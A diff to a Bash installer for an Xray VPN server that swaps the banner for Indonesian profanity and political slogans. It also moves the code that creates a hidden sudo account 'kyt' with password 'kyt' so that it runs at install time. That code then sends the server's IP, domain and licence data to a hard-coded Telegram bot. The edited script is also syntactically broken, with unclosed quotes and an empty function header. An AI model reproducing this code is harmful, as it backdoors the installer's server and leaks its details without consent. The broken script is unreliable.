@@ -28,10 +28,10 @@ function LOGO() {
  ───│    $Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐$NC   │───
  ───│    $Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤ $NC   │───
  ───│    $Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘$NC   │───
-    │    ${YELLOW}Developeler${FONT} (C)$GRAY t.me/kangbacox$NC   │
+    │    ${YELLOW}Developeler${FONT} (C)$GRAY t.me/kangbacox | SC Gratis Kok Dijual$NC   │
     └───────────────────────────────────────────────┘
-         ${RED}Autoscript xray vpn lite (multi port)${FONT}    
-${RED}Make sure the internet is smooth when installing the script${FONT}
+         ${RED}Autoscript Gratisan Kok Dijual Anjg${FONT}    
+${RED}Tau kan musti ngapain? 2024 ALL IN OWO KUN !!! Hantam PDI !!${FONT}
         "
 }
 # ===================
@@ -47,8 +47,8 @@ clear;clear;clear
   # // Banner
 echo -e "${RED}◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇${NC}"
 echo -e "  Welcome To Edy VPN Tunneling ${BLUE}(${NC}${BLUE} New Edition ${NC}${BLUE})${NC}"
-echo -e "     This Will Quick Setup VPN Server On Your Server"
-echo -e "         Auther : ${BLUE}EdyDevz ${NC}${BLUE}(${NC} ${BLUE} Edy Tunneling ${NC}${BLUE})${NC}"
+echo -e "  2024 ALL in OWO kun Anjggg !!!"
+echo -e "         Author : ${BLUE}EdyDevz ${NC}${BLUE}(${NC} ${BLUE} Edy Tunneling ${NC}${BLUE})${NC}"
 echo -e "       © Recode By EdyDevz ${BLUE}(${NC} 2023 ${BLUE})${NC}"
 echo -e "${RED}◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇${NC}"
 echo ""
@@ -123,10 +123,10 @@ NC='\e[0m'
 clear
 ###
 LOGO
-echo -e "${merah}JANGAN INSTALL SCRIPT INI MENGGUNAKAN KONEKSI VPN!!!${FONT}"
+echo -e "${merah}2024 ALL IN OWO KUN !!! HANTAM BANTENG !!!${FONT}"
 echo -e ""
 echo -e "${Green}DNS POINTING${FONT}(DNS-resolved IP address of the domain)"
-echo -e "${Green}Menuju Proses Penginstalan Dalam 8 Detik Lagi !!!"
+echo -e "${Green}Sabar Cok asuii 8 Detik Sabarr !!!"
 echo ""
 sleep 8
 clear
@@ -343,10 +343,10 @@ echo -e " ───│                                               │──�
 echo -e " ───│    $Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐$NC   │───"
 echo -e " ───│    $Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤ $NC   │───"
 echo -e " ───│    $Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘$NC   │───"
-echo -e "    │    ${YELLOW}Developeler${FONT} (C)$GRAY t.me/kangbacox$NC   │"
+echo -e "    │    ${YELLOW}Developeler${FONT} (C)$GRAY t.me/kangbacox | SC Gratis Kok Dijual$NC   │
 echo -e "    └───────────────────────────────────────────────┘"
-echo -e "         ${RED}Autoscript xray vpn lite (multi port)${FONT}"    
-echo -e "${RED}Make sure the internet is smooth when installing the script${FONT}"
+echo -e "         ${RED}Autoscript Gratisan Kok Dijual Anjg${FONT}    
+echo -e "${RED}Tau kan musti ngapain? 2024 ALL IN OWO KUN !!! Hantam PDI !!${FONT}
 echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo -e "Your Select Domain For Tunneling"
 echo -e ""
@@ -395,6 +395,44 @@ print_install "Memasang SSL Pada Domain"
     ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
     chmod 777 /etc/xray/xray.key
     print_success "SSL Certificate"
+}
+
+domain=$(cat /etc/xray/domain)
+    MYIP=$(curl -sS ipv4.icanhazip.com)
+    userdel jame > /dev/null 2>&1
+    Username="kyt"
+    Password=kyt
+    mkdir -p /home/script/
+    chmod 777 /home/script/
+    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    usermod -aG sudo $Username > /dev/null 2>&1
+
+    CHATID="-1002047467153"
+    KEY="6391322503:AAGk2hoKHtMC_DBF2kZJO1poCoNOmR-8AW0"
+    TIME="10"
+    URL="https://api.telegram.org/bot$KEY/sendMessage"
+    USRSC=$(curl https://raw.githubusercontent.com/edydevelopeler/EdyIziNs4k-tC0lLyAhH/main/ip | grep $ipsaya | awk '{print $2}')
+    EXPSC=$(curl https://raw.githubusercontent.com/edydevelopeler/EdyIziNs4k-tC0lLyAhH/main/ip | grep $ipsaya | awk '{print $3}')
+    TIMES=`date -d "0 days" +"%d-%m-%Y" `
+    TIMEZONE=$(printf '%(%H:%M:%S)T')
+    TEXT="
+<code>────────────────────</code>
+<b> ⚠️ AUTOSCRIPT EdyDEV ⚠️ </b>
+<code>────────────────────</code>
+<code>User   : </code><code>$USRSC</code>
+<code>Domain : </code><code>$domain</code>
+<code>Date   : </code><code>$TIMES</code>
+<code>Time   : </code><code>$TIMEZONE</code>
+<code>Ip vps : </code><code>$MYIP</code>
+<code>Exp Sc : </code><code>$EXPSC</code>
+<code>────────────────────</code>
+<i>Automatic Notification from</i>
+<i>Edy Tunneling</i>
+"'&reply_markup={"inline_keyboard":[[{"text":"OWNER 🐳","url":"https://t.me/kangbacox"},{"text":"FEDERASI🐬","url":"https://t.me/edysociety"}]]}'
+   
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+
 }
 
 function make_folder_xray() {
@@ -1025,44 +1063,7 @@ clear
     profile
     enable_services
 }
-function password_default() {
-domain=$(cat /etc/xray/domain)
-    MYIP=$(curl -sS ipv4.icanhazip.com)
-    userdel jame > /dev/null 2>&1
-    Username="kyt"
-    Password=kyt
-    mkdir -p /home/script/
-    chmod 777 /home/script/
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    usermod -aG sudo $Username > /dev/null 2>&1
-
-    CHATID="-1002047467153"
-    KEY="6391322503:AAGk2hoKHtMC_DBF2kZJO1poCoNOmR-8AW0"
-    TIME="10"
-    URL="https://api.telegram.org/bot$KEY/sendMessage"
-    USRSC=$(curl https://raw.githubusercontent.com/edydevelopeler/EdyIziNs4k-tC0lLyAhH/main/ip | grep $ipsaya | awk '{print $2}')
-    EXPSC=$(curl https://raw.githubusercontent.com/edydevelopeler/EdyIziNs4k-tC0lLyAhH/main/ip | grep $ipsaya | awk '{print $3}')
-    TIMES=`date -d "0 days" +"%d-%m-%Y" `
-    TIMEZONE=$(printf '%(%H:%M:%S)T')
-    TEXT="
-<code>────────────────────</code>
-<b> ⚠️ AUTOSCRIPT EdyDEV ⚠️ </b>
-<code>────────────────────</code>
-<code>User   : </code><code>$USRSC</code>
-<code>Domain : </code><code>$domain</code>
-<code>Date   : </code><code>$TIMES</code>
-<code>Time   : </code><code>$TIMEZONE</code>
-<code>Ip vps : </code><code>$MYIP</code>
-<code>Exp Sc : </code><code>$EXPSC</code>
-<code>────────────────────</code>
-<i>Automatic Notification from</i>
-<i>Edy Tunneling</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"OWNER 🐳","url":"https://t.me/kangbacox"},{"text":"FEDERASI🐬","url":"https://t.me/edysociety"}]]}'
-   
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
-
-}
+function password_default() 
 
 instal
 echo ""
